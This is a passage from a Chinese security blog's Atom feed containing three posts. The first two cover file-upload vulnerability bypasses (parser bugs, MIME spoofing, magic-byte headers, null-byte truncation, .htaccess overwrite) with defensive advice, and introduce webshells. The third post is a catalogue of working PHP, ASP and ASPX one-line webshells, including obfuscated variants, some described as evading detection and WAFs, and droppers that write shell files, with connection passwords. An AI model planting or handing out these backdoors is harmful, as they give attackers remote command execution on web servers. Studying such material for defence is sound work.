&quot;invalid file type&quot;;</span><br><span class="line"></span><br><span class="line">  return;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>白名单策略是更加安全的，通过限制上传类型为只有我们接受的类型，可以较好的保证安全，因为黑名单我们可以使用各种方法来进行注入和突破。</p><h4 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h4><p>当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。</p><h4 id="绕过方法：-1"><a href="#绕过方法：-1" class="headerlink" title="绕过方法："></a>绕过方法：</h4><p>在一些Web server中，存在解析漏洞<br>。</p><p>1、老版本的IIS6中的目录解析漏洞，如果网站目录中有一个 /.asp/目录，那么此目录下面的一切内容都会被当作asp脚本来解析。</p><p>2、老板本的IIS6中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg<br>。</p><p>3、旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行。</p><p>4、nginx(0.5.x, 0.6.x, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）。</p><p>5、apache1.x,2.x的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的。</p><h1 id="检查HTTP-Header中的Content-Type："><a href="#检查HTTP-Header中的Content-Type：" class="headerlink" title="检查HTTP Header中的Content-Type："></a>检查HTTP Header中的Content-Type：</h1><h4 id="原理：-2"><a href="#原理：-2" class="headerlink" title="原理："></a>原理：</h4><p>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的,因为HTTP header可以被发出者或者中间人任意的修改，不过加上一层防护也是可以有一定效果的。</p><h4 id="绕过方法：-2"><a href="#绕过方法：-2" class="headerlink" title="绕过方法："></a>绕过方法：</h4><p>使用各种各样的工具（如burpsuite）强行篡改Header就可以，将Content-Type: application/php改为其他web程序允许的类型。</p><p>Content-Type: image/jpg</p><p>Content-Type: image/png</p><p>Content-Type: text/plain</p><h4 id="常用的MIMETYPE表："><a href="#常用的MIMETYPE表：" class="headerlink" title="常用的MIMETYPE表："></a>常用的MIMETYPE表：</h4><p>text/plain（纯文本）</p><p>text/html（HTML文档）</p><p>text/javascript（js代码）</p><p>application/xhtml+xml（XHTML文档）</p><p>image/gif（GIF图像）</p><p>image/jpeg（JPEG图像）</p><p>image/png（PNG图像）</p><p>video/mpeg（MPEG动画）</p><p>application/octet-stream（二进制数据）</p><p>application/pdf（PDF文档）</p><p>application/(编程语言) 该种语言的代码</p><p>application/msword（Microsoft Word文件）</p><p>message/rfc822（RFC 822形式）</p><p>multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）</p><p>application/x-www-form-urlencoded（POST方法提交的表单）</p><p>multipart/form-data（POST提交时伴随文件上传的表单）</p><h1 id="分析头文件内容检查文件类型："><a href="#分析头文件内容检查文件类型：" class="headerlink" title="分析头文件内容检查文件类型："></a>分析头文件内容检查文件类型：</h1><p>与检查扩展名不同，还有一种检查类型的方式是使用对于文件内容的验证机制，这种方法利用的是每一个特定类型的文件都会有不太一样的开头或者标志位。</p><p><img src="https://upload-images.jianshu.io/upload_images/9113969-a4972b3d227f4712.png?imageMogr2/auto-orient/" alt></p><p>在正常情况下，通过判断前10个字节，基本上就能判断出一个文件的真实类型。<br>可以通过比如php的exif_imagetype()函数，一个通过这种方法来过滤的示例代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (! exif_imagetype($_FILES[&apos;uploadedfile&apos;][&apos;tmp_name&apos;])) &#123;</span><br><span class="line">       echo &quot;File is not an image&quot;;</span><br><span class="line">       return;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>也可以自己编写函数来进行识别，图片文件通常有称作幻数的头字节，我们来看一下几种图片文件的幻数：<br>（注意！下面是二进制而不是文本格式的数据）</p><p>JPG:</p><p><code>FF D8 FF E0 00 10 4A 46 49 46</code></p><p>GIF:</p><p><code>47 49 46 38 39 61</code>(相当于文本的GIF89a)</p><p>PNG:</p><p><code>89 50 4E 47</code></p><h4 id="绕过方法：-3"><a href="#绕过方法：-3" class="headerlink" title="绕过方法："></a>绕过方法：</h4><p>给上传脚本加上相应的幻数头字节就可以，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：<br>（一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php</span><br><span class="line">do_something();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>如果是其他类型的二进制文件，也有响应的头字节，如下表：</p><p><img src="https://upload-images.jianshu.io/upload_images/9113969-cf4c7c27a2bea500.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/801/format/webp" alt></p><h1 id="限制Web-Server对于特定类型文件的行为"><a href="#限制Web-Server对于特定类型文件的行为" class="headerlink" title="限制Web Server对于特定类型文件的行为:"></a>限制Web Server对于特定类型文件的行为:</h1><p>导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般来说，用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 ./upload/ 下面要防止数据被当作代码执行，我们可以限制web server对于特定文件夹的行为。</p><p>大多数服务端软件都可以支持用户对于特定类型文件的行为的自定义，以Apache为例：</p><p>在默认情况下，对与 .php文件Apache会当作代码来执行，对于 html,css,js文件，则会直接由HTTP Response交给客户端程序对于一些资源文件，比如txt，doc，rar等等，则也会以文件下载的方式传送的客户端。我们希望用户上传的东西仅仅当作资源和数据而不能当作代码。</p><p>因此可以使用服务器程序的接口来进行限制。</p><p>以Apache为例,我们可以利用 .htaccess 文件机制来对web server行为进行限制。</p><p>禁止脚本执行有多种方式可以实现，而且分别有不同的效果：</p><p>1、指定特定扩展名的文件的处理方式,原理是指定Response的Content-Type可以加上如下几行</p><p><code>AddType text/plain .pl .py .php</code></p><p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的Content-Type。</p><p>2、如果要完全禁止特定扩展名的文件被访问，用下面的几行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Options -ExecCGI</span><br><span class="line">AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别</span><br></pre></td></tr></table></figure><p>在这种情况下，以上几种类型的文件被访问的时候，会返回403 Forbidden的错误。</p><p>3、也可以强制web服务器对于特定文件类型的处理，与第一条不同的是， 下面的方法直接强行让apache将文件识别为你指定的类型。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$&quot;&gt;</span><br><span class="line">ForceType text/plain</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型</p><p>4、只允许访问特定类型的文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Files ^(*.jpeg|*.jpg|*.png|*.gif)&gt;</span><br><span class="line">order deny,allow</span><br><span class="line">deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure><p>在一个上传图片的文件夹下面，就可以加上这段代码，使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问。</p><p>这又是一个白名单的处理方案，永远记得，白名单是最有保障的安全措施。</p><h4 id="绕过方法：-4"><a href="#绕过方法：-4" class="headerlink" title="绕过方法："></a>绕过方法：</h4><p>可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限。</p><h1 id="文件系统00截断："><a href="#文件系统00截断：" class="headerlink" title="文件系统00截断："></a>文件系统00截断：</h1><h4 id="原理：-3"><a href="#原理：-3" class="headerlink" title="原理："></a>原理：</h4><p>在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00上传截断漏洞。</p><h4 id="绕过方法：-5"><a href="#绕过方法：-5" class="headerlink" title="绕过方法："></a>绕过方法：</h4><p>通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。</p><h1 id="其它方式—绕过："><a href="#其它方式—绕过：" class="headerlink" title="其它方式—绕过："></a>其它方式—绕过：</h1><h4 id="原理：-4"><a href="#原理：-4" class="headerlink" title="原理："></a>原理：</h4><p>部分程序员的思维不严谨，并使用逻辑不完善的上传文件合法性检测手段，导致可以找到方式绕过其检测方式。</p><h4 id="绕过方法：-6"><a href="#绕过方法：-6" class="headerlink" title="绕过方法："></a>绕过方法：</h4><p>1、后缀名大小写绕过<br>用于只将小写的脚本后缀名(如php)过滤掉的场合；<br>例如:将Burpsuite截获的数据包中的文件名【evil.php】改为【evil.Php】</p><p>2、双写后缀名绕过<br>用于只将文件后缀名过滤掉的场合，例如”php”字符串过滤的；<br>例如:上传时将Burpsuite截获的数据包中文件名【evil.php】改为【evil.pphphp】，那么过滤了第一个”php”字符串”后，开头的’p’和结尾的’hp’就组合又形成了【php】。</p><p>3、特殊后缀名绕过<br>用于检测文件合法性的脚本有问题的场合；<br>例如:将Burpsuite截获的数据包中【evil.php】名字改为【evil.php6】，或加个空格改为【evil.php 】等。</p><h1 id="文件上传漏洞防御："><a href="#文件上传漏洞防御：" class="headerlink" title="文件上传漏洞防御："></a>文件上传漏洞防御：</h1><p>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径。<br> 其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法得到Web容器解释这个脚本，那么也不能称之为漏洞。<br> 最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。</p><p>防范文件上传漏洞常见的几种方法：</p><h6 id="1、文件上传的目录设置为不可执行"><a href="#1、文件上传的目录设置为不可执行" class="headerlink" title="1、文件上传的目录设置为不可执行"></a>1、文件上传的目录设置为不可执行</h6><p>只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</p><h6 id="2、判断文件类型"><a href="#2、判断文件类型" class="headerlink" title="2、判断文件类型"></a>2、判断文件类型</h6><p>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p><h6 id="3、使用随机数改写文件名和文件路径"><a href="#3、使用随机数改写文件名和文件路径" class="headerlink" title="3、使用随机数改写文件名和文件路径"></a>3、使用随机数改写文件名和文件路径</h6><p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</p><h6 id="4、单独设置文件服务器的域名"><a href="#4、单独设置文件服务器的域名" class="headerlink" title="4、单独设置文件服务器的域名"></a>4、单独设置文件服务器的域名</h6><p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</p><p><strong>系统开发阶段的防御：</strong></p><p>系统开发人员应有较强的安全意识，尤其是采用PHP语言开发系统。在系统开发阶段应充分考虑系统的安全性。对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查。客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡一些基本的试探。服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查。</p><p> <strong>系统运行阶段的防御：</strong></p><p>系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复。定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补。对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。</p><h3 id="参考（侵删）："><a href="#参考（侵删）：" class="headerlink" title="参考（侵删）："></a>参考（侵删）：</h3><p><a href="https://www.jianshu.com/p/5ebba0482980" target="_blank" rel="noopener">https://www.jianshu.com/p/5ebba0482980</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前端限制：&quot;&gt;&lt;a href=&quot;#前端限制：&quot; class=&quot;headerlink&quot; title=&quot;前端限制：&quot;&gt;&lt;/a&gt;前端限制：&lt;/h1&gt;&lt;h4 id=&quot;前端代码：&quot;&gt;&lt;a href=&quot;#前端代码：&quot; class=&quot;headerlink&quot; title=&quot;前端代
      
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传漏洞" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞简介</title>
    <link href="http://yoursite.com/2019/08/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/"/>
    <id>http://yoursite.com/2019/08/15/文件上传漏洞简介/</id>
    <published>2019-08-15T12:02:56.176Z</published>
    <updated>2019-08-15T23:55:49.764Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞概念："><a href="#文件上传漏洞概念：" class="headerlink" title="文件上传漏洞概念："></a>文件上传漏洞概念：</h1><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p><p>文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。</p><h1 id="Webshell简介："><a href="#Webshell简介：" class="headerlink" title="Webshell简介："></a>Webshell简介：</h1><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</p><p>WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录，没有经验的管理员不容易发现入侵痕迹。攻击者可以将WebShell隐藏在正常文件中并修改文件时间增强隐蔽性，也可以采用一些函数对WebShell进行编码或者拼接以规避检测。除此之外，通过一句话木马的小马来提交功能更强大的大马可以更容易通过应用本身的检测。</p><p><code>&lt;?php eval($_POST[a]); ?&gt;</code>就是一个最常见最原始的小马。</p><h1 id="文件上传漏洞形成原因："><a href="#文件上传漏洞形成原因：" class="headerlink" title="文件上传漏洞形成原因："></a>文件上传漏洞形成原因：</h1><p>1 、对于上传文件的后缀名（扩展名）没有做较为严格的限制。</p><p>2 、对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查。</p><p>3 、权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）。</p><p>4、 对于web server对于上传文件或者指定目录的行为没有做限制。</p><h1 id="文件上传漏洞原理："><a href="#文件上传漏洞原理：" class="headerlink" title="文件上传漏洞原理："></a>文件上传漏洞原理：</h1><p>在 WEB 中进行文件上传的原理是通过将表单设为 multipart/form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上。</p><h1 id="漏洞导致的后果："><a href="#漏洞导致的后果：" class="headerlink" title="漏洞导致的后果："></a>漏洞导致的后果：</h1><p>1、上传文件是web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行。</p><p>2、上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为（其它通过类似方式控制策略文件的情况类似）。</p><p>3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。</p><p>4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺骗。</p><p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块；或者上传一个合法的文本文件，其内容包含了PHP脚本，再通过“本地文件包含漏洞（Local File Include）”执行此脚本等等。</p><h3 id="参考（侵删）："><a href="#参考（侵删）：" class="headerlink" title="参考（侵删）："></a>参考（侵删）：</h3><p><a href="https://www.jianshu.com/p/5ebba0482980" target="_blank" rel="noopener">https://www.jianshu.com/p/5ebba0482980</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件上传漏洞概念：&quot;&gt;&lt;a href=&quot;#文件上传漏洞概念：&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞概念：&quot;&gt;&lt;/a&gt;文件上传漏洞概念：&lt;/h1&gt;&lt;p&gt;文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可
      
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传漏洞" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>一句话木马源代码</title>
    <link href="http://yoursite.com/2019/08/09/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%BA%90%E4%BB%A3%E7%A0%81/"/>
    <id>http://yoursite.com/2019/08/09/一句话木马源代码/</id>
    <published>2019-08-09T14:48:14.700Z</published>
    <updated>2019-08-09T14:59:20.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP一句话："><a href="#PHP一句话：" class="headerlink" title="PHP一句话："></a>PHP一句话：</h1><h6 id="1、普通一句话："><a href="#1、普通一句话：" class="headerlink" title="1、普通一句话："></a>1、普通一句话：</h6><p><code>&lt;?php</code></p><p><code>@eval($_POST[123456]);</code></p><p><code>?&gt;</code></p><p>*post后面中括号里面的内容是使用菜刀或蚁剑连接时的密码</p><h6 id="2、防爆破一句话："><a href="#2、防爆破一句话：" class="headerlink" title="2、防爆破一句话："></a>2、防爆破一句话：</h6><p><code>&lt;?php</code></p><p><code>substr(md5($_REQUEST[&#39;x&#39;]),28)==&#39;6862&#39;&amp;&amp;eval($_REQUEST[&#39;password&#39;]);</code></p><p><code>?&gt;</code></p><p>*菜刀地址<a href="http://192.168.64.137/x.php?x=myh0st" target="_blank" rel="noopener">http://192.168.64.137/x.php?x=myh0st</a></p><h6 id="3、过狗一句话"><a href="#3、过狗一句话" class="headerlink" title="3、过狗一句话:"></a>3、过狗一句话:</h6><p><code>&lt;?php</code></p><p><code>($_=@$_GET[s]).@$_($_POST[hihack])</code></p><p><code>?&gt;</code>      //菜刀地址 <a href="http://localhost/1.php?s=assert" target="_blank" rel="noopener">http://localhost/1.php?s=assert</a></p><p><code>&lt;php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[hihack]);</code></p><p><code>?&gt;</code></p><h6 id="4、404隐藏的一句话："><a href="#4、404隐藏的一句话：" class="headerlink" title="4、404隐藏的一句话："></a>4、404隐藏的一句话：</h6><p>​    <code>&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</code><br>​        <code>&lt;html&gt;&lt;head&gt;</code><br>​        <code>&lt;title&gt;404 Not Found&lt;/title&gt;</code><br>​        <code>&lt;/head&gt;&lt;body&gt;</code><br>​        <code>&lt;h1&gt;Not Found&lt;/h1&gt;</code><br>​        <code>&lt;p&gt;</code>The requested URL /error.php was not found on this server.        <code>&lt;/p&gt;</code><br>​        <code>&lt;/body&gt;&lt;/html&gt;</code><br>​        <code>&lt;?php</code><br>​            <code>@preg_replace(&quot;/[checksql]/e&quot;,$_POST[&#39;hihack&#39;],&quot;saft&quot;);</code><br>​        <code>?&gt;</code></p><p>​    菜刀连接时在配置栏添加：</p><p>​    <code>&lt;O&gt;date=@eval($_POST[paxmac]);&lt;/O&gt;</code></p><h6 id="5、不用问号-的一句话："><a href="#5、不用问号-的一句话：" class="headerlink" title="5、不用问号(?)的一句话："></a>5、不用问号(?)的一句话：</h6><p><code>&lt;script language=&quot;php&quot;&gt;eval ($_POST[hihack]);&lt;/script&gt;</code></p><h6 id="6、躲避检测："><a href="#6、躲避检测：" class="headerlink" title="6、躲避检测："></a>6、躲避检测：</h6><p><code>&lt;?php assert($_REQUEST[&quot;hihack&quot;]);?&gt;</code></p><h6 id="7、变形一句话后门："><a href="#7、变形一句话后门：" class="headerlink" title="7、变形一句话后门："></a>7、变形一句话后门：</h6><?php fputs (fopen(pack("H*","6c6f7374776f6c662e706870"),"w"),pack("H*","3c3f406576616c28245f504f53545b6c6f7374776f6c665d293f3e"))?><?php @fputs(fopen(base64_decode('bXloMHN0LnBocA=='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydoaWhhY2snXSk7Pz4='));?><p>访问该网页，然后菜刀连接：/myh0st.php  密码：hihack</p><h1 id="ASP一句话："><a href="#ASP一句话：" class="headerlink" title="ASP一句话："></a>ASP一句话：</h1><h6 id="1、普通一句话：-1"><a href="#1、普通一句话：-1" class="headerlink" title="1、普通一句话："></a>1、普通一句话：</h6><p><code>&lt;%eval request(&quot;hihack&quot;)%&gt;</code>或<code>&lt;%execute(request(&quot;hihack&quot;))%&gt;</code></p><h6 id="2、unicode编码的access木马-："><a href="#2、unicode编码的access木马-：" class="headerlink" title="2、unicode编码的access木马 ："></a>2、unicode编码的access木马 ：</h6><p>向access数据库插入 ┼攠數畣整爠煥敵瑳∨≡┩&gt;   编码前：<code>&lt;% execute request(&quot;a&quot;)%&gt;</code></p><p>然后备份出webshell，密码a</p><h6 id="3、配置文件插马（需要条件支持，插入的数据被写在了配置文件中）："><a href="#3、配置文件插马（需要条件支持，插入的数据被写在了配置文件中）：" class="headerlink" title="3、配置文件插马（需要条件支持，插入的数据被写在了配置文件中）："></a>3、配置文件插马（需要条件支持，插入的数据被写在了配置文件中）：</h6><p>插入：<code>&quot;%&gt;&lt;% bbbb=request(&quot;aaaa&quot;)%&gt;&lt;%eval(bbbb)%&gt;&lt;%&#39;</code>        </p><p>访问报错，获取到配置文件的地址，然后连接，密码aaaa</p><h6 id="4、不用-的一句话："><a href="#4、不用-的一句话：" class="headerlink" title="4、不用%的一句话："></a>4、不用%的一句话：</h6><p><code>&lt;script language=VBScript runat=server&gt;execute request(&quot;hihack&quot;)&lt;/script&gt;</code></p><h6 id="5、不用双引号-“-的一句话："><a href="#5、不用双引号-“-的一句话：" class="headerlink" title="5、不用双引号(“)的一句话："></a>5、不用双引号(“)的一句话：</h6><p><code>&lt;%eval request(chr(35))%&gt;</code>        密码：#</p><h1 id="ASPX一句话："><a href="#ASPX一句话：" class="headerlink" title="ASPX一句话："></a>ASPX一句话：</h1><h6 id="1、普通一句话：-2"><a href="#1、普通一句话：-2" class="headerlink" title="1、普通一句话："></a>1、普通一句话：</h6><p>​    &lt;%@ Page Language=”Jscript”%&gt;       &lt;%eval(Request.Item[“hihack”],”unsafe”);%&gt;</p><h6 id="2、免杀一句话："><a href="#2、免杀一句话：" class="headerlink" title="2、免杀一句话："></a>2、免杀一句话：</h6><p>&lt;%@PAGE LANGUAGE=JSCRIPT%&gt;&lt;%var PAY:String=Request[“\x61\x62\x63\x64”];eval(PAY,”\x75\x6E\x73\x61”+”\x66\x65”);%&gt; </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP一句话：&quot;&gt;&lt;a href=&quot;#PHP一句话：&quot; class=&quot;headerlink&quot; title=&quot;PHP一句话：&quot;&gt;&lt;/a&gt;PHP一句话：&lt;/h1&gt;&lt;h6 id=&quot;1、普通一句话：&quot;&gt;&lt;a href=&quot;#1、普通一句话：&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传漏洞" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
</feed>
